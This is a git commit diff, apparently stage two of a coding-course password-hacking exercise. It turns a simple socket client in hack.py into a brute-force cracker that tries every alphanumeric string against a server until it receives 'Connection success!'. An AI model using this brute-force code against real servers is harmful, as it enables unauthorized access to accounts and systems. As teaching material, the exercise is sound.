43315a541979bc6f76c2046d656f57f92ca08d51
parseltongist <>
2021-12-14 20:05:54 +0100

    stage 2/5

--- hack.py
+++ hack.py
@@ -1,16 +1,45 @@
+from itertools import product
 import socket
-
 import sys
+import string
 
-args = sys.argv
 
-ip_address = args[1]
-port = int(args[2])
-message = args[3].encode()
+def password_generator():
+    possible_symbols = string.ascii_letters + string.digits
+    for i in range(1000000):
+        for message in product(possible_symbols, repeat=i + 1):
+            yield message
 
-with socket.socket() as client_soket:
-    client_soket.connect((ip_address, port))
-    client_soket.send(message)
-    response = client_soket.recv(1024).decode()
-    print(response)
 
+def connect_to_server(arguments):
+    _ip_address = arguments[1]
+    _port = int(arguments[2])
+    _client_soket = socket.socket()
+    _client_soket.connect((_ip_address, _port))
+    return _client_soket
+
+
+def hack_password(client_socket):  # client_socket
+    generator = password_generator()
+    for message in generator:
+        password = ''.join(message)
+        client_socket.send(password.encode())
+        response = client_socket.recv(1024).decode()
+        if response == "Connection success!":
+            print(password)
+            break
+
+
+def main():
+    args = sys.argv
+    if len(args) < 3:
+        print("Not enough arguments. Please provide : ip_address, port, message")
+        exit()
+    client_socket = connect_to_server(args)
+    hack_password(client_socket)
+
+    client_socket.close()  # close connection
+
+
+if __name__ == '__main__':
+    main()
